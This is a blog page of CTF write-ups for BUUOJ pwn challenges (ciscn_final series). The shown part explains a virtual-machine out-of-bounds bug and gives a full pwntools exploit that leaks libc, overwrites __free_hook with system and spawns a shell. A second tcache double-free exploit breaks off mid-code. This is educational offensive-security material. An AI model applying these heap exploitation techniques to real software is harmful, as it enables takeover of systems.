<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="BUUOJ 刷题记录(一)"><meta name="keywords" content="BUUOJ,pwn,ciscn_final_1,ciscn_final_2,ciscn_final_3,ciscn_final_4,ciscn_final_5,ciscn_final_6,ciscn_final_7,ciscn_final_8,ciscn_final_9,ciscn_final_10"><meta name="author" content="Nop"><meta name="copyright" content="Nop"><title>BUUOJ 刷题记录(一) | Nop's Blog</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  }
} </script><meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Nop's Blog" type="application/atom+xml">
</head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-final-1"><span class="toc-number">1.</span> <span class="toc-text">ciscn_final_1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#思路"><span class="toc-number">1.2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">1.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-final-2"><span class="toc-number">2.</span> <span class="toc-text">ciscn_final_2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言-1"><span class="toc-number">2.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#思路-1"><span class="toc-number">2.2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-1"><span class="toc-number">2.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-final-3"><span class="toc-number">3.</span> <span class="toc-text">ciscn_final_3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言-2"><span class="toc-number">3.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#思路-2"><span class="toc-number">3.2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-2"><span class="toc-number">3.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-final-4"><span class="toc-number">4.</span> <span class="toc-text">ciscn_final_4</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言-3"><span class="toc-number">4.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#思路-3"><span class="toc-number">4.2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-3"><span class="toc-number">4.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-final-5"><span class="toc-number">5.</span> <span class="toc-text">ciscn_final_5</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言-4"><span class="toc-number">5.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#思路-4"><span class="toc-number">5.2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-4"><span class="toc-number">5.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-final-6"><span class="toc-number">6.</span> <span class="toc-text">ciscn_final_6</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言-5"><span class="toc-number">6.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#思路-5"><span class="toc-number">6.2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-5"><span class="toc-number">6.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-final-7"><span class="toc-number">7.</span> <span class="toc-text">ciscn_final_7</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言-6"><span class="toc-number">7.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#思路-6"><span class="toc-number">7.2.</span> <span class="toc-text">思路</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-final-8"><span class="toc-number">8.</span> <span class="toc-text">ciscn_final_8</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言-7"><span class="toc-number">8.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#思路-7"><span class="toc-number">8.2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-6"><span class="toc-number">8.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-final-9"><span class="toc-number">9.</span> <span class="toc-text">ciscn_final_9</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言-8"><span class="toc-number">9.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#思路-8"><span class="toc-number">9.2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-7"><span class="toc-number">9.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-final-10"><span class="toc-number">10.</span> <span class="toc-text">ciscn_final_10</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言-9"><span class="toc-number">10.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#思路-9"><span class="toc-number">10.2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-8"><span class="toc-number">10.3.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://n0nop.com/img/avatar.jpg"></div><div class="author-info__name text-center">Nop</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">28</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">6</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">6</span></a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://n0nop.com/img/background.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Nop's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/about">About</a></span><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a></span></div><div id="post-info"><div id="post-title">BUUOJ 刷题记录(一)</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-05-05</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/Writeup/">Writeup</a><div class="post-meta-wordcount"><span>Word count: </span><span class="word-count">7.4k</span><span class="post-meta__separator">|</span><span>Reading time: 37 min</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>pwnable.tw做不动了，发现BUUOJ上的题目挺多的，加上想刷一刷2019国赛的题目，这两天断断续续地做了几道题目，简单记录一下。<br><br><b>更新：10道刷完，有些题目还是挺有意思的。</b></p>
<a id="more"></a>
<h1 id="ciscn-final-1"><a href="#ciscn-final-1" class="headerlink" title="ciscn_final_1"></a>ciscn_final_1</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>binary内部实现了一个虚拟机，有自己的指令集，其实逻辑搞清楚了问题不大（虽然我看了蛮久），主要是写脚本的时候要花点时间。（本地给的glibc2.23的环境，打通了；但是远程给的glibc2.27，在调试的时候发现<code>mmap</code>没有触发，也就是说分配出来的内存空间没有紧挨着libc，结果没法打通。讲道理不应该啊，两个版本的libc这里的逻辑不是一样吗，阈值应该都是128k啊。）</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol>
<li>16 bits的机器码，大端数据，高4 bits是opcode，后面要么是寄存器的index，要么是立即数，要么是标志位。若高4 bits是0xF，根据低8 bits的值，对应了一些输出，停机，退出指令。（binary的database不小心删了，就不贴反汇编的代码了）</li>
<li>关键在于利用其中的<code>opcode==6</code>和<code>opcode==7</code>的两条指令，分别是对应访问内存以及写入内存，且地址是32 bits，说明可以相对内存溢出。</li>
<li>由于内存是分配在堆上的，而且申请的<code>size==0x1FFFE</code>，是会通过<code>mmap</code>申请的，而且位置正好紧挨着libc且位于上方。所以通过上述的根据偏移访问内存和读写内存可以操作到libc的位置上。</li>
<li>所以根据以上，可以通过溢出，根据偏移读写libc。</li>
<li>首先读出<code>_IO_list_all</code>位置存的<code>_IO_2_1_stderr_</code>的地址，从而leak libc。</li>
<li>再向<code>__free_hook</code>写<code>system</code></li>
<li>最后在输入指令的时候，在内存开头写入”/bin/sh”，并且在虚拟机开始执行的地址处(偏移为0x6000=0x3000 *sizeof(_WORD))写入<code>exit</code>指令触发<code>free</code>内存的操作，从而getshell。</li>
<li>以上步骤可以通过<code>halt</code>分隔，因为<code>halt</code>可以重新接受输入指令再次执行。</li>
<li><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addi</span><span class="params">(reg_dst, reg_src, imm)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(imm &lt;= <span class="number">0xF</span>)</span><br><span class="line">    binary_str = <span class="string">"0001"</span></span><br><span class="line">    binary_str += bin(reg_dst)[<span class="number">2</span>:].rjust(<span class="number">3</span>, <span class="string">"0"</span>)</span><br><span class="line">    binary_str += bin(reg_src)[<span class="number">2</span>:].rjust(<span class="number">3</span>, <span class="string">"0"</span>)</span><br><span class="line">    binary_str += <span class="string">"1"</span></span><br><span class="line">    binary_str += bin(imm)[<span class="number">2</span>:].rjust(<span class="number">5</span>, <span class="string">"0"</span>)</span><br><span class="line">    val = int(binary_str, <span class="number">2</span>)  </span><br><span class="line">    <span class="keyword">return</span> big_endian(val)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_code</span><span class="params">(reg_dst, reg_src_1, reg_src_2)</span>:</span></span><br><span class="line">    binary_str = <span class="string">"0110"</span></span><br><span class="line">    binary_str += bin(reg_dst)[<span class="number">2</span>:].rjust(<span class="number">3</span>, <span class="string">"0"</span>)</span><br><span class="line">    binary_str += bin(reg_src_1)[<span class="number">2</span>:].rjust(<span class="number">3</span>, <span class="string">"0"</span>)</span><br><span class="line">    binary_str += bin(reg_src_2)[<span class="number">2</span>:].rjust(<span class="number">3</span>, <span class="string">"0"</span>)</span><br><span class="line">    binary_str += <span class="string">"000"</span></span><br><span class="line">    val = int(binary_str, <span class="number">2</span>)  </span><br><span class="line">    <span class="keyword">return</span> big_endian(val)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_code</span><span class="params">(reg_dst, reg_src_1, reg_src_2)</span>:</span></span><br><span class="line">    binary_str = <span class="string">"0111"</span></span><br><span class="line">    binary_str += bin(reg_dst)[<span class="number">2</span>:].rjust(<span class="number">3</span>, <span class="string">"0"</span>)</span><br><span class="line">    binary_str += bin(reg_src_1)[<span class="number">2</span>:].rjust(<span class="number">3</span>, <span class="string">"0"</span>)</span><br><span class="line">    binary_str += bin(reg_src_2)[<span class="number">2</span>:].rjust(<span class="number">3</span>, <span class="string">"0"</span>)</span><br><span class="line">    binary_str += <span class="string">"000"</span></span><br><span class="line">    val = int(binary_str, <span class="number">2</span>)  </span><br><span class="line">    <span class="keyword">return</span> big_endian(val)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(reg_dst, imm)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(imm &lt;= <span class="number">0xFF</span>)</span><br><span class="line">    binary_str = <span class="string">"0010"</span></span><br><span class="line">    binary_str += bin(reg_dst)[<span class="number">2</span>:].rjust(<span class="number">3</span>, <span class="string">"0"</span>)</span><br><span class="line">    binary_str += bin(imm)[<span class="number">2</span>:].rjust(<span class="number">9</span>, <span class="string">"0"</span>)</span><br><span class="line">    val = int(binary_str, <span class="number">2</span>)  </span><br><span class="line">    <span class="keyword">return</span> big_endian(val)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(reg_src, imm)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(imm &lt;= <span class="number">0xFF</span>)</span><br><span class="line">    binary_str = <span class="string">"0011"</span></span><br><span class="line">    binary_str += bin(reg_src)[<span class="number">2</span>:].rjust(<span class="number">3</span>, <span class="string">"0"</span>)</span><br><span class="line">    binary_str += bin(imm)[<span class="number">2</span>:].rjust(<span class="number">9</span>, <span class="string">"0"</span>)</span><br><span class="line">    val = int(binary_str, <span class="number">2</span>)  </span><br><span class="line">    <span class="keyword">return</span> big_endian(val)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_reg0</span><span class="params">()</span>:</span></span><br><span class="line">    val = <span class="number">0xF021</span></span><br><span class="line">    <span class="keyword">return</span> big_endian(val)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">halt</span><span class="params">()</span>:</span></span><br><span class="line">    val = <span class="number">0xF025</span></span><br><span class="line">    <span class="keyword">return</span> big_endian(val)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">big_endian</span><span class="params">(val)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> chr(val &gt;&gt; <span class="number">8</span>) + chr(val &amp; <span class="number">0xFF</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_stderr</span><span class="params">()</span>:</span></span><br><span class="line">    offset = (_IO_list_all_offset + <span class="number">0x22000</span> - <span class="number">8</span>) / <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">'\x30\x00'</span> <span class="comment"># $pc start</span></span><br><span class="line">    p.sendafter(<span class="string">"Input: "</span>, payload)</span><br><span class="line"></span><br><span class="line">    payload = read(<span class="number">1</span>, <span class="number">7</span>) <span class="comment"># $r1 = code[$pc + 7] = code[0x3008]</span></span><br><span class="line">    payload += read(<span class="number">2</span>, <span class="number">7</span>) <span class="comment"># $r2 = code[$pc + 7] = code[0x3009]</span></span><br><span class="line">    payload += read_code(<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>) <span class="comment"># $r0 = code[($r1 &lt;&lt; 8) + $r2]</span></span><br><span class="line">    payload += print_reg0() <span class="comment"># print $r0</span></span><br><span class="line">    payload += addi(<span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>) <span class="comment"># $r2 = $r2 + 1</span></span><br><span class="line">    payload += read_code(<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>) <span class="comment"># $r0 = code[($r1 &lt;&lt; 8) + $r2]</span></span><br><span class="line">    payload += print_reg0() <span class="comment"># print $r0</span></span><br><span class="line">    payload += halt() <span class="comment"># halt</span></span><br><span class="line">    payload += big_endian(offset &gt;&gt; <span class="number">16</span>)</span><br><span class="line">    payload += big_endian(offset &amp; <span class="number">0xFFFF</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_free_hook</span><span class="params">()</span>:</span></span><br><span class="line">    offset = (__free_hook_offset + <span class="number">0x22000</span> - <span class="number">8</span>) / <span class="number">2</span></span><br><span class="line">    </span><br><span class="line">    payload = <span class="string">'\x30\x00'</span> <span class="comment"># $pc start</span></span><br><span class="line">    p.sendafter(<span class="string">"Input: "</span>, payload)</span><br><span class="line"></span><br><span class="line">    payload = read(<span class="number">1</span>, <span class="number">7</span>) <span class="comment"># $r1 = code[$pc + 7] = code[0x3008]</span></span><br><span class="line">    payload += read(<span class="number">2</span>, <span class="number">7</span>) <span class="comment"># $r2 = code[$pc + 7] = code[0x3009]</span></span><br><span class="line">    payload += read(<span class="number">3</span>, <span class="number">7</span>) <span class="comment"># $r3 = code[$pc + 7] = code[0x300A]</span></span><br><span class="line">    payload += write_code(<span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>) <span class="comment"># code[($r1 &lt;&lt; 8) + $r2] = $r3</span></span><br><span class="line">    payload += addi(<span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>) <span class="comment"># $r2 = $r2 + 1</span></span><br><span class="line">    payload += read(<span class="number">3</span>, <span class="number">5</span>) <span class="comment"># $r3 = code[$pc + 7] = code[0x300B]</span></span><br><span class="line">    payload += write_code(<span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>) <span class="comment"># code[($r1 &lt;&lt; 8) + $r2] = $r3</span></span><br><span class="line">    payload += halt() <span class="comment"># halt</span></span><br><span class="line">    payload += big_endian(offset &gt;&gt; <span class="number">16</span>)</span><br><span class="line">    payload += big_endian(offset &amp; <span class="number">0xFFFF</span>)</span><br><span class="line">    payload += big_endian(libc_system &amp; <span class="number">0xFFFF</span>)</span><br><span class="line">    payload += big_endian(libc_system &gt;&gt; <span class="number">16</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span><span class="params">()</span>:</span></span><br><span class="line">    val = <span class="number">0xF026</span></span><br><span class="line">    <span class="keyword">return</span> big_endian(val)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getshell</span><span class="params">()</span>:</span></span><br><span class="line">    payload = <span class="string">'\x00\x00'</span> </span><br><span class="line">    p.sendafter(<span class="string">"Input: "</span>, payload)</span><br><span class="line"></span><br><span class="line">    payload = big_endian(u16(<span class="string">"/b"</span>))</span><br><span class="line">    payload += big_endian(u16(<span class="string">"in"</span>))</span><br><span class="line">    payload += big_endian(u16(<span class="string">"/s"</span>))</span><br><span class="line">    payload += big_endian(u16(<span class="string">"h\x00"</span>))</span><br><span class="line">    payload = payload.ljust(<span class="number">0x6000</span>, <span class="string">'A'</span>)</span><br><span class="line">    payload += quit()</span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line">_IO_list_all_offset = libc.sym[<span class="string">"_IO_list_all"</span>]</span><br><span class="line">stderr_offset = libc.sym[<span class="string">"_IO_2_1_stderr_"</span>]</span><br><span class="line">system_offset = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">__free_hook_offset = libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line"><span class="comment"># realloc_offset = libc.symbols["realloc"]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">libc_stderr = leak_stderr()</span><br><span class="line">libc_base = libc_stderr - stderr_offset</span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># write __free_hook</span></span><br><span class="line">write_free_hook()</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger __free_hook</span></span><br><span class="line">getshell()</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"libc_system: "</span> + hex(libc_system))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


</li>
</ol>
<h1 id="ciscn-final-2"><a href="#ciscn-final-2" class="headerlink" title="ciscn_final_2"></a>ciscn_final_2</h1><h2 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h2><p>本地调试的时候因为创建的<code>flag</code>文件是空的，啥也没打印出来，结果以为没成功，愣是浪费时间，有点蠢。</p>
<h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><ol>
<li><code>execve</code>被禁了，但是<code>flag</code>打开了而且文件描述符改为666。</li>
<li>很明显的tcache double free，开始以为后面要rop，因为exit里面接受了99个字符的输入，感觉可以写rop chain然后跳过来；后来发现每次写要么只能写2 bytes，要么4 bytes，而地址至少6 bytes，显然行不通。</li>
<li>改变思路，把<code>stdin-&gt;_fileno</code>改为666，让它在<code>scanf</code>的时候自己读flag自己打印出来就行了。</li>
<li>由于直接读写都只能是2或者4 bytes，所以还要考虑一下堆布局，分配<code>stdin</code>的chunk空间还是要通过partial write unsorted bin-&gt;bk，至于unsorted bin需要伪造size得到，细节就不赘述了。</li>
<li>改完<code>stdin-&gt;_fileno</code>退出就能打印出flag了。（有个不明白的地方，开始还担心改完了<code>stdin-&gt;_fileno</code>之后，标准输入流就失效了，那怎么选择退出功能？结果<code>read</code>还是照样可以输入，但是<code>scanf</code>却是直接从<code>flag</code>里面读的，什么原因？）</li>
<li>还有一个点是，由于double free利用一般是<code>free</code>两次然后<code>malloc</code>三次，所以这里如果一开始tcache bin是空的也就是<code>count==0</code>，那么利用完了之后<code>count==0xFFFF</code>从而被误认为已经满了，所以后续如果<code>free</code>这个size的chunk，是不会放到tcache bin里面的，所以要先<code>free</code>几个块填个位置，防止<code>count==0xFFFF</code>。</li>
</ol>
<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(type, inode)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"which command?\n&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"TYPE:\n1: int\n2: short int\n&gt;"</span>, str(type))</span><br><span class="line">    p.sendlineafter(<span class="string">"your inode number:"</span>, str(inode))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(type)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"which command?\n&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"TYPE:\n1: int\n2: short int\n&gt;"</span>, str(type))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(type)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"which command?\n&gt; "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"TYPE:\n1: int\n2: short int\n&gt;"</span>, str(type))</span><br><span class="line">    p.recvuntil(<span class="string">"your int type inode number :"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"which command?\n&gt; "</span>, <span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line">main_arena_offset = <span class="number">0x3ebc40</span></span><br><span class="line">stdin_offset = libc.sym[<span class="string">"_IO_2_1_stdin_"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># double free</span></span><br><span 